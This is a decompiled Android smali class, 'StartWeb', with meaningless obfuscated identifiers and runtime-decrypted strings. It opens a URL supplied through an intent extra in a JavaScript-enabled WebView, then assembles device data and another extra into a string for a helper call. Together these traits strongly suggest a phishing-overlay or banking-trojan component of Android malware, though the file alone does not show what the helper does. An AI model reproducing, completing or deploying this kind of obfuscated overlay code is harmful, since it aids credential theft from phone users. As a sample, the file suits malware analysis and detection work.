.class public Lcompse/refact/st/upsssss/StartWeb;
.super Landroid/app/Activity;


# instance fields
.field fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/serfwefewfwefewef;

.field sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

.field private zxcvxvsdvsvsvs:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/StartWeb;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v0, Lcompse/refact/st/upsssss/serfwefewfwefewef;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/serfwefewfwefewef;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/StartWeb;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/serfwefewfwefewef;

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 7

    const/4 v6, 0x0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/StartWeb;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "\u0008]\t"

    invoke-static {v1}, Lcompse/refact/st/upsssss/uiiliuluiiuluilulu;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "T\u0003M"

    invoke-static {v2}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v2, Landroid/webkit/WebView;

    invoke-direct {v2, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object v2, p0, Lcompse/refact/st/upsssss/StartWeb;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    iget-object v2, p0, Lcompse/refact/st/upsssss/StartWeb;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v2, p0, Lcompse/refact/st/upsssss/StartWeb;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    new-instance v3, Lcompse/refact/st/upsssss/fsafsdfsfsdfsfsdfsd;

    invoke-direct {v3, p0, p0}, Lcompse/refact/st/upsssss/fsafsdfsfsdfsfsdfsd;-><init>(Lcompse/refact/st/upsssss/StartWeb;Landroid/app/Activity;)V

    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    iget-object v2, p0, Lcompse/refact/st/upsssss/StartWeb;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    invoke-virtual {v2, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    iget-object v1, p0, Lcompse/refact/st/upsssss/StartWeb;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    invoke-virtual {p0, v1}, Lcompse/refact/st/upsssss/StartWeb;->setContentView(Landroid/view/View;)V

    iget-object v1, p0, Lcompse/refact/st/upsssss/StartWeb;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/serfwefewfwefewef;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v6, v0}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "\u0017F\u001c\u0007\u000bA\u000b"

    invoke-static {v2}, Lcompse/refact/st/upsssss/uiiliuluiiuluilulu;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "!<"

    invoke-static {v3}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v6, v3}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcompse/refact/st/upsssss/StartWeb;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Lcompse/refact/st/upsssss/StartWeb;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-virtual {v5, p0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v6, v5}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "U,L\u0019\t\u0008]\u001a[\u000f\u0008\u0007"

    invoke-static {v5}, Lcompse/refact/st/upsssss/uiiliuluiiuluilulu;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->zxcvxvsdvsvsvs(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v0, v2}, Lcompse/refact/st/upsssss/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    return-void
.end method
